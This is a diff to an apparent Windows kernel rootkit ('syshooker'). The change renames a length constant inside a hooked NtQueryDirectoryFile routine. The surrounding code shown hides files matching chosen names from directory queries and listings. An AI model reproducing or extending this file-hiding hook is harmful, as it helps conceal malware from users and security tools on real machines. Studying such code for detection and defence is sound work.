@@ -42,8 +42,8 @@ NTSTATUS DetourNtQueryDirectoryFile(
 	if (NT_SUCCESS(OriginalStatus)) {
 		if (FileName != nullptr) {
 			// check whether the user-supplied FileName query contains the filename that we want to hide, if yes, return File Not Found
-			WCHAR TempBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-			for (size_t i = 0; i < FileName->Length && i < MAX_PATH_SYSHOOKER - 1; i++) {
+			WCHAR TempBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
+			for (size_t i = 0; i < FileName->Length && i < SYSHOOKER_MAX_NAME_LENGTH - 1; i++) {
 				TempBuffer[i] = FileName->Buffer[i];
 			}
 			if (matchMagicNames(TempBuffer, (Target)TARGET_FILE)) { // FileName is optionally used, for example, in tab-complete
@@ -58,8 +58,8 @@ NTSTATUS DetourNtQueryDirectoryFile(
 			PFILE_ID_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
 
 			while (1) {
-				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+				WCHAR FileNameBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
+				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < SYSHOOKER_MAX_NAME_LENGTH - 1; ++i) {
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				//kprintf("[+] syshooker: NtQueryDirectoryFile: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
